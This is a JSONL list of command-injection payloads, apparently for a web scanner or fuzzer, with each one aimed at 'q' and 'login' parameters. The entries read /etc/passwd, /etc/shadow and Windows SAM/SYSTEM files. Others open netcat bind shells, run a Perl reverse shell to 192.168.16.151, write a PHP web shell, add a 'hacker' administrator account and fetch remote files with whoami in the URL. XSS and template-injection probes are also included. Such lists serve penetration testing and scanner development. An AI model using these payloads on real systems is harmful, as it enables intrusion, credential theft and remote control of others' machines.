+{"id": "command-injection-1079f1c2-login", "payload": "; type %SYSTEMROOT%\\repair\\SYSTEM", "injection_point": "login", "fragment": false}
+{"id": "command-injection-c71c45ea-q", "payload": "; type C:\\WINNT\\repair\\SAM", "injection_point": "q", "fragment": false}
+{"id": "command-injection-c71c45ea-login", "payload": "; type C:\\WINNT\\repair\\SAM", "injection_point": "login", "fragment": false}
+{"id": "command-injection-a587f573-q", "payload": "; type C:\\Windows\\repair\\SYSTEM", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a587f573-login", "payload": "; type C:\\Windows\\repair\\SYSTEM", "injection_point": "login", "fragment": false}
+{"id": "command-injection-10c56b09-q", "payload": "; uname -a", "injection_point": "q", "fragment": false}
+{"id": "command-injection-10c56b09-login", "payload": "; uname -a", "injection_point": "login", "fragment": false}
+{"id": "command-injection-732afe75-q", "payload": "; wget https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-732afe75-login", "payload": "; wget https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-4d7f211d-q", "payload": ";${@print(md5(RCEVulnerable))};", "injection_point": "q", "fragment": false}
+{"id": "command-injection-4d7f211d-login", "payload": ";${@print(md5(RCEVulnerable))};", "injection_point": "login", "fragment": false}
+{"id": "command-injection-fef61daf-q", "payload": ";id\\n", "injection_point": "q", "fragment": false}
+{"id": "command-injection-fef61daf-login", "payload": ";id\\n", "injection_point": "login", "fragment": false}
+{"id": "command-injection-8d13c060-q", "payload": ";|/usr/bin/id|", "injection_point": "q", "fragment": false}
+{"id": "command-injection-8d13c060-login", "payload": ";|/usr/bin/id|", "injection_point": "login", "fragment": false}
+{"id": "command-injection-34391f4a-q", "payload": "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", "injection_point": "q", "fragment": false}
+{"id": "command-injection-34391f4a-login", "payload": "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1f1e6154-q", "payload": "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1f1e6154-login", "payload": "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->", "injection_point": "login", "fragment": false}
+{"id": "command-injection-75e251e0-q", "payload": "<!--#exec cmd=\"/usr/bin/id;-->", "injection_point": "q", "fragment": false}
+{"id": "command-injection-75e251e0-login", "payload": "<!--#exec cmd=\"/usr/bin/id;-->", "injection_point": "login", "fragment": false}
+{"id": "command-injection-969b49fc-q", "payload": "<?php system(\"cat /etc/passwd\");?>", "injection_point": "q", "fragment": false}
+{"id": "command-injection-969b49fc-login", "payload": "<?php system(\"cat /etc/passwd\");?>", "injection_point": "login", "fragment": false}
+{"id": "command-injection-add351b6-q", "payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj\");?>", "injection_point": "q", "fragment": false}
+{"id": "command-injection-add351b6-login", "payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj\");?>", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ea53985f-q", "payload": "\\n\\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\\`whoami\\`", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ea53985f-login", "payload": "\\n\\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\\`whoami\\`", "injection_point": "login", "fragment": false}
+{"id": "command-injection-77c3ff65-q", "payload": "\\n\\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\\`whoami\\`", "injection_point": "q", "fragment": false}
+{"id": "command-injection-77c3ff65-login", "payload": "\\n\\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\\`whoami\\`", "injection_point": "login", "fragment": false}
+{"id": "command-injection-196f3657-q", "payload": "\\necho INJECTX\\nexit\\n\\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\\n", "injection_point": "q", "fragment": false}
+{"id": "command-injection-196f3657-login", "payload": "\\necho INJECTX\\nexit\\n\\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\\n", "injection_point": "login", "fragment": false}
+{"id": "command-injection-7da28d03-q", "payload": "\\nid\\n", "injection_point": "q", "fragment": false}
+{"id": "command-injection-7da28d03-login", "payload": "\\nid\\n", "injection_point": "login", "fragment": false}
+{"id": "command-injection-9fdd7094-q", "payload": "\\nid|", "injection_point": "q", "fragment": true}
+{"id": "command-injection-9fdd7094-login", "payload": "\\nid|", "injection_point": "login", "fragment": true}
+{"id": "command-injection-156de42b-q", "payload": "\\r", "injection_point": "q", "fragment": true}
+{"id": "command-injection-156de42b-login", "payload": "\\r", "injection_point": "login", "fragment": true}
+{"id": "command-injection-dd8544cc-q", "payload": "a;id|", "injection_point": "q", "fragment": false}
+{"id": "command-injection-dd8544cc-login", "payload": "a;id|", "injection_point": "login", "fragment": false}
+{"id": "command-injection-dae696ae-q", "payload": "cat /etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "command-injection-dae696ae-login", "payload": "cat /etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "command-injection-e7ebbff9-q", "payload": "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\\\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-e7ebbff9-login", "payload": "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\\\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-2b64c6d9-q", "payload": "dir", "injection_point": "q", "fragment": true}
+{"id": "command-injection-2b64c6d9-login", "payload": "dir", "injection_point": "login", "fragment": true}
+{"id": "command-injection-029d9cca-q", "payload": "dir C:\\Documents and Settings\\*", "injection_point": "q", "fragment": false}
+{"id": "command-injection-029d9cca-login", "payload": "dir C:\\Documents and Settings\\*", "injection_point": "login", "fragment": false}
+{"id": "command-injection-227cb8a4-q", "payload": "echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "injection_point": "q", "fragment": false}
+{"id": "command-injection-227cb8a4-login", "payload": "echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "injection_point": "login", "fragment": false}
+{"id": "command-injection-bfc2c586-q", "payload": "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "injection_point": "q", "fragment": false}
+{"id": "command-injection-bfc2c586-login", "payload": "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "injection_point": "login", "fragment": false}
+{"id": "command-injection-2926244f-q", "payload": "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX", "injection_point": "q", "fragment": false}
+{"id": "command-injection-2926244f-login", "payload": "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX", "injection_point": "login", "fragment": false}
+{"id": "command-injection-2845163d-q", "payload": "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX", "injection_point": "q", "fragment": false}
+{"id": "command-injection-2845163d-login", "payload": "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1b8cf3ce-q", "payload": "eval('pwd')", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1b8cf3ce-login", "payload": "eval('pwd')", "injection_point": "login", "fragment": false}
+{"id": "command-injection-66bd9e30-q", "payload": "eval('pwd');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-66bd9e30-login", "payload": "eval('pwd');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-9465d631-q", "payload": "eval('sleep 5')", "injection_point": "q", "fragment": false}
+{"id": "command-injection-9465d631-login", "payload": "eval('sleep 5')", "injection_point": "login", "fragment": false}
+{"id": "command-injection-c3c2229c-q", "payload": "eval('sleep 5');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-c3c2229c-login", "payload": "eval('sleep 5');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-addd61c6-q", "payload": "exec('whoami')", "injection_point": "q", "fragment": false}
+{"id": "command-injection-addd61c6-login", "payload": "exec('whoami')", "injection_point": "login", "fragment": false}
+{"id": "command-injection-5381bf26-q", "payload": "ipconfig", "injection_point": "q", "fragment": true}
+{"id": "command-injection-5381bf26-login", "payload": "ipconfig", "injection_point": "login", "fragment": true}
+{"id": "command-injection-c754be48-q", "payload": "ls -l /home/*", "injection_point": "q", "fragment": false}
+{"id": "command-injection-c754be48-login", "payload": "ls -l /home/*", "injection_point": "login", "fragment": false}
+{"id": "command-injection-498d017a-q", "payload": "ls -l /tmp", "injection_point": "q", "fragment": false}
+{"id": "command-injection-498d017a-login", "payload": "ls -l /tmp", "injection_point": "login", "fragment": false}
+{"id": "command-injection-e9f644e1-q", "payload": "nc -lvvp 4447 -e /bin/sh;", "injection_point": "q", "fragment": false}
+{"id": "command-injection-e9f644e1-login", "payload": "nc -lvvp 4447 -e /bin/sh;", "injection_point": "login", "fragment": false}
+{"id": "command-injection-472d694d-q", "payload": "net localgroup Administrators hacker /ADD", "injection_point": "q", "fragment": false}
+{"id": "command-injection-472d694d-login", "payload": "net localgroup Administrators hacker /ADD", "injection_point": "login", "fragment": false}
+{"id": "command-injection-9a990e35-q", "payload": "netstat", "injection_point": "q", "fragment": true}
+{"id": "command-injection-9a990e35-login", "payload": "netstat", "injection_point": "login", "fragment": true}
+{"id": "command-injection-86b08086-q", "payload": "netstat -an", "injection_point": "q", "fragment": false}
+{"id": "command-injection-86b08086-login", "payload": "netstat -an", "injection_point": "login", "fragment": false}
+{"id": "command-injection-77a634bd-q", "payload": "perl -e 'print \"X\"x8192'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-77a634bd-login", "payload": "perl -e 'print \"X\"x8192'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ea60c612-q", "payload": "phpinfo()", "injection_point": "q", "fragment": true}
+{"id": "command-injection-ea60c612-login", "payload": "phpinfo()", "injection_point": "login", "fragment": true}
+{"id": "command-injection-60df228e-q", "payload": "phpinfo();", "injection_point": "q", "fragment": true}
+{"id": "command-injection-60df228e-login", "payload": "phpinfo();", "injection_point": "login", "fragment": true}
+{"id": "command-injection-39060861-q", "payload": "sleep 1", "injection_point": "q", "fragment": false}
+{"id": "command-injection-39060861-login", "payload": "sleep 1", "injection_point": "login", "fragment": false}
+{"id": "command-injection-6aae6ef4-q", "payload": "sleep 5", "injection_point": "q", "fragment": false}
+{"id": "command-injection-6aae6ef4-login", "payload": "sleep 5", "injection_point": "login", "fragment": false}
+{"id": "command-injection-ff901ca2-q", "payload": "system('cat C:\\boot.ini');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-ff901ca2-login", "payload": "system('cat C:\\boot.ini');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-45de5149-q", "payload": "system('cat config.php');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-45de5149-login", "payload": "system('cat config.php');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-5a312df6-q", "payload": "system('pwd');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-5a312df6-login", "payload": "system('pwd');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-b810e30e-q", "payload": "system('sleep 5');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-b810e30e-login", "payload": "system('sleep 5');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1110a1fa-q", "payload": "system('whoami');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1110a1fa-login", "payload": "system('whoami');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-d51e34a4-q", "payload": "systeminfo", "injection_point": "q", "fragment": true}
+{"id": "command-injection-d51e34a4-login", "payload": "systeminfo", "injection_point": "login", "fragment": true}
+{"id": "command-injection-367ddb9a-q", "payload": "test* && perl -e 'print \"X\"x16096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-367ddb9a-login", "payload": "test* && perl -e 'print \"X\"x16096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-73c83db8-q", "payload": "type C:\\WINNT\\repair\\SYSTEM", "injection_point": "q", "fragment": false}
+{"id": "command-injection-73c83db8-login", "payload": "type C:\\WINNT\\repair\\SYSTEM", "injection_point": "login", "fragment": false}
+{"id": "command-injection-d62a0c50-q", "payload": "wget https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-d62a0c50-login", "payload": "wget https://crowdshield.com/.testing/rce_vuln.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-a41e115e-q", "payload": "which curl", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a41e115e-login", "payload": "which curl", "injection_point": "login", "fragment": false}
+{"id": "command-injection-a2b61937-q", "payload": "which perl", "injection_point": "q", "fragment": false}
+{"id": "command-injection-a2b61937-login", "payload": "which perl", "injection_point": "login", "fragment": false}
+{"id": "command-injection-10bd76c8-q", "payload": "which wget", "injection_point": "q", "fragment": false}
+{"id": "command-injection-10bd76c8-login", "payload": "which wget", "injection_point": "login", "fragment": false}
+{"id": "command-injection-3457eb0c-q", "payload": "{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-3457eb0c-login", "payload": "{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-43aaa6fe-q", "payload": "{{4+4}}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-43aaa6fe-login", "payload": "{{4+4}}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-d1400c1b-q", "payload": "{{4+8}}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-d1400c1b-login", "payload": "{{4+8}}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-933f7004-q", "payload": "{{person.name}}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-933f7004-login", "payload": "{{person.name}}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-5dd90c56-q", "payload": "{{person.secret}}", "injection_point": "q", "fragment": false}
+{"id": "command-injection-5dd90c56-login", "payload": "{{person.secret}}", "injection_point": "login", "fragment": false}
+{"id": "command-injection-cac9bc7d-q", "payload": "| dir C:\\Users", "injection_point": "q", "fragment": false}
+{"id": "command-injection-cac9bc7d-login", "payload": "| dir C:\\Users", "injection_point": "login", "fragment": false}
+{"id": "command-injection-527d772a-q", "payload": "| ls -l /", "injection_point": "q", "fragment": false}
+{"id": "command-injection-527d772a-login", "payload": "| ls -l /", "injection_point": "login", "fragment": false}
+{"id": "command-injection-9779023f-q", "payload": "| ls -l /etc/", "injection_point": "q", "fragment": false}
+{"id": "command-injection-9779023f-login", "payload": "| ls -l /etc/", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1497268f-q", "payload": "| ls -l /tmp", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1497268f-login", "payload": "| ls -l /tmp", "injection_point": "login", "fragment": false}
+{"id": "command-injection-d688eb0f-q", "payload": "| ls -laR /etc", "injection_point": "q", "fragment": false}
+{"id": "command-injection-d688eb0f-login", "payload": "| ls -laR /etc", "injection_point": "login", "fragment": false}
+{"id": "command-injection-1798182e-q", "payload": "| ls -laR /var/www", "injection_point": "q", "fragment": false}
+{"id": "command-injection-1798182e-login", "payload": "| ls -laR /var/www", "injection_point": "login", "fragment": false}
+{"id": "command-injection-b2ef13f6-q", "payload": "| nc -lvvp 4444 -e /bin/sh|", "injection_point": "q", "fragment": false}
+{"id": "command-injection-b2ef13f6-login", "payload": "| nc -lvvp 4444 -e /bin/sh|", "injection_point": "login", "fragment": false}
+{"id": "command-injection-81b8d6d1-q", "payload": "| net localgroup Administrators hacker /ADD", "injection_point": "q", "fragment": false}
+{"id": "command-injection-81b8d6d1-login", "payload": "| net localgroup Administrators hacker /ADD", "injection_point": "login", "fragment": false}
+{"id": "command-injection-4f7c584c-q", "payload": "| perl -e 'print \"X\"x4096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-4f7c584c-login", "payload": "| perl -e 'print \"X\"x4096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-31cfee6d-q", "payload": "| system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-31cfee6d-login", "payload": "| system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "injection_point": "login", "fragment": false}
+{"id": "command-injection-f7cd087c-q", "payload": "| uname -a", "injection_point": "q", "fragment": false}
+{"id": "command-injection-f7cd087c-login", "payload": "| uname -a", "injection_point": "login", "fragment": false}
+{"id": "command-injection-634e01e6-q", "payload": "| wget http://crowdshield.com/.testing/rce.txt", "injection_point": "q", "fragment": false}
+{"id": "command-injection-634e01e6-login", "payload": "| wget http://crowdshield.com/.testing/rce.txt", "injection_point": "login", "fragment": false}
+{"id": "command-injection-734d512f-q", "payload": "|| perl -e 'print \"X\"x16096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-734d512f-login", "payload": "|| perl -e 'print \"X\"x16096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-05bbe7a8-q", "payload": "|| perl -e 'print \"X\"x4096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-05bbe7a8-login", "payload": "|| perl -e 'print \"X\"x4096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-d0c42ef7-q", "payload": "|| perl -e 'print \"X\"x8096'", "injection_point": "q", "fragment": false}
+{"id": "command-injection-d0c42ef7-login", "payload": "|| perl -e 'print \"X\"x8096'", "injection_point": "login", "fragment": false}
+{"id": "command-injection-8110abe4-q", "payload": "|| sleep 10", "injection_point": "q", "fragment": false}
+{"id": "command-injection-8110abe4-login", "payload": "|| sleep 10", "injection_point": "login", "fragment": false}
+{"id": "command-injection-b42c67f8-q", "payload": "|| system('sleep 5');", "injection_point": "q", "fragment": false}
+{"id": "command-injection-b42c67f8-login", "payload": "|| system('sleep 5');", "injection_point": "login", "fragment": false}
